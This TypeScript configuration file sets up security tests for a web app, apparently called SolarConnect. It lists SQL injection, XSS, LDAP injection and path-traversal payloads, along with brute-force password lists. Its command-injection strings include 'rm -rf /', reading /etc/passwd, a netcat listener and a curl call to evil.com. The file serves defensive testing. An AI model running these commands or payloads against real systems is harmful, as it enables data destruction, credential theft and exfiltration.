/**
 * Security Testing Configuration
 * 
 * Configuration settings for security tests including attack patterns,
 * thresholds, and test parameters.
 * 
 * Requirements: 7.1, 7.4, 7.5
 */

export interface SecurityTestConfig {
  attackVectors: {
    sqlInjection: string[]
    xssPayloads: string[]
    commandInjection: string[]
    ldapInjection: string[]
    pathTraversal: string[]
  }
  bruteForce: {
    commonPasswords: string[]
    maxAttempts: number
    lockoutDuration: number
    rateLimitThreshold: number
  }
  timing: {
    maxVariancePercentage: number
    minExecutionTime: number
    sampleSize: number
  }
  penetrationTesting: {
    botnetIPs: string[]
    suspiciousUserAgents: string[]
    socialEngineeringPasswords: string[]
  }
  thresholds: {
    securityScoreMinimum: number
    timingVarianceMax: number
    rateLimitEffectiveness: number
  }
}

export const DEFAULT_SECURITY_CONFIG: SecurityTestConfig = {
  attackVectors: {
    sqlInjection: [
      "admin'--",
      "admin' OR '1'='1",
      "'; DROP TABLE users; --",
      "admin' UNION SELECT * FROM users WHERE '1'='1",
      "1' OR '1'='1' /*",
      "admin'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --"
    ],
    xssPayloads: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ],
    commandInjection: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& whoami',
      '; ls -la',
      '| nc -l 4444',
      '; curl http://evil.com/steal.php'
    ],
    ldapInjection: [
      ')(|(password=*))',
      '*))(|(password=*',
      ')(cn=*)',
      '*)((|',
      ')(|(objectClass=*))',
      '*))(|(cn=*'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ]
  },
  bruteForce: {
    commonPasswords: [
      'password', '123456', 'password123', 'admin', 'qwerty',
      'letmein', 'welcome', 'monkey', '1234567890', 'password1',
      'Password1', 'Password123', 'admin123', 'root', 'toor',
      'pass', 'test', 'guest', 'user', 'login'
    ],
    maxAttempts: 5,
    lockoutDuration: 1800, // 30 minutes in seconds
    rateLimitThreshold: 5
  },
  timing: {
    maxVariancePercentage: 30,
    minExecutionTime: 50, // milliseconds
    sampleSize: 10
  },
  penetrationTesting: {
    botnetIPs: [
      '203.0.113.1', '203.0.113.2', '203.0.113.3',
      '198.51.100.1', '198.51.100.2', '198.51.100.3',
      '192.0.2.1', '192.0.2.2', '192.0.2.3'
    ],
    suspiciousUserAgents: [
      'Hydra v9.0',
      'Medusa v2.2',
      'BruteForcer/1.0',
      'AttackBot/1.0',
      'VulnScanner/3.0',
      'sqlmap/1.0',
      'Nikto/2.1.6',
      'w3af.org'
    ],
    socialEngineeringPasswords: [
      'SolarConnect2023', 'solarconnect123', 'Solar123!',
      'Company2023', 'Welcome2023', 'Password2023',
      'Admin2023', 'User2023', 'Login2023'
    ]
  },
  thresholds: {
    securityScoreMinimum: 80,
    timingVarianceMax: 50,
    rateLimitEffectiveness: 90
  }
}

export class SecurityTestConfigManager {
  private config: SecurityTestConfig

  constructor(config: SecurityTestConfig = DEFAULT_SECURITY_CONFIG) {
    this.config = config
  }

  getConfig(): SecurityTestConfig {
    return this.config
  }

  updateConfig(updates: Partial<SecurityTestConfig>): void {
    this.config = { ...this.config, ...updates }
  }

  getAttackVectors(): SecurityTestConfig['attackVectors'] {
    return this.config.attackVectors
  }

  getBruteForceConfig(): SecurityTestConfig['bruteForce'] {
    return this.config.bruteForce
  }

  getTimingConfig(): SecurityTestConfig['timing'] {
    return this.config.timing
  }

  getPenetrationTestingConfig(): SecurityTestConfig['penetrationTesting'] {
    return this.config.penetrationTesting
  }

  getThresholds(): SecurityTestConfig['thresholds'] {
    return this.config.thresholds
  }

  validateSecurityScore(score: number): boolean {
    return score >= this.config.thresholds.securityScoreMinimum
  }

  validateTimingVariance(variance: number): boolean {
    return variance <= this.config.thresholds.timingVarianceMax
  }

  validateRateLimitEffectiveness(effectiveness: number): boolean {
    return effectiveness >= this.config.thresholds.rateLimitEffectiveness
  }

  generateCustomAttackPayloads(basePayload: string, variations: string[]): string[] {
    const payloads = [basePayload]
    
    variations.forEach(variation => {
      payloads.push(basePayload + variation)
      payloads.push(variation + basePayload)
    })

    return payloads
  }

  getRandomAttackVector(type: keyof SecurityTestConfig['attackVectors']): string {
    const vectors = this.config.attackVectors[type]
    return vectors[Math.floor(Math.random() * vectors.length)]
  }

  getRandomBruteForcePassword(): string {
    const passwords = this.config.bruteForce.commonPasswords
    return passwords[Math.floor(Math.random() * passwords.length)]
  }

  getRandomBotnetIP(): string {
    const ips = this.config.penetrationTesting.botnetIPs
    return ips[Math.floor(Math.random() * ips.length)]
  }

  getRandomSuspiciousUserAgent(): string {
    const agents = this.config.penetrationTesting.suspiciousUserAgents
    return agents[Math.floor(Math.random() * agents.length)]
  }
}

export const securityConfig = new SecurityTestConfigManager()